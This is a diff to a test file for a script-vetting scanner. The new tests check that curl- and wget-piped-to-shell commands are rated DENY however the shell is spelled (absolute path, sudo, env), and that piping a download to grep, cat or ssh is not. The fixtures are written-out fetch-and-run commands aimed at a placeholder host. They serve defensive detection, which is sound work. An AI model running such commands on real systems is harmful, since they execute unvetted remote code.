@@ -253,6 +253,47 @@ test("malicious script (curl piped to sh) is DENY", () => {
   assert.ok(verdict.findings.some((f) => f.rule === "download-execute"));
 });
 
+test("download-and-execute via absolute path, sudo, or env is DENY, not an evasion", () => {
+  // The executor after the pipe may be spelled /bin/sh, sudo sh, or
+  // /usr/bin/env bash: all of those run the downloaded bytes exactly the
+  // way a bare `| sh` does, so they must DENY the same way.
+  const texts = [
+    "curl https://x.example/install.sh | /bin/sh",
+    "curl https://x.example/install.sh | /bin/bash",
+    "curl https://x.example/install.sh | sudo sh",
+    "curl https://x.example/install.sh | sudo /bin/bash",
+    "curl https://x.example/install.sh | /usr/bin/env bash",
+    "curl https://x.example/install.sh | ./sh",
+    "curl https://x.example/install.sh | /bin/sh -s",
+    "wget -qO- https://x.example/install.sh | /bin/sh",
+  ];
+  for (const text of texts) {
+    const verdict = vetScriptContent({
+      url: "https://x.example/bad.sh",
+      text,
+    });
+    assert.equal(verdict.verdict, "DENY", text);
+    assert.ok(
+      verdict.findings.some((f) => f.rule === "download-execute"),
+      JSON.stringify(verdict.findings),
+    );
+  }
+});
+
+test("piping a download to a non-executor stays REVIEW, never DENY", () => {
+  for (const text of [
+    "curl https://x.example/data.txt | grep foo",
+    "curl https://x.example/data.txt | /bin/cat",
+    "curl https://x.example/data.txt | ssh user@host 'cat > /tmp/x'",
+  ]) {
+    const verdict = vetScriptContent({
+      url: "https://x.example/u.sh",
+      text,
+    });
+    assert.notEqual(verdict.verdict, "DENY", text);
+  }
+});
+
 test("hidden unicode alone is REVIEW; hidden unicode plus network is DENY", () => {
   const alone = vetScriptContent({
     url: "https://x.example/h.sh",
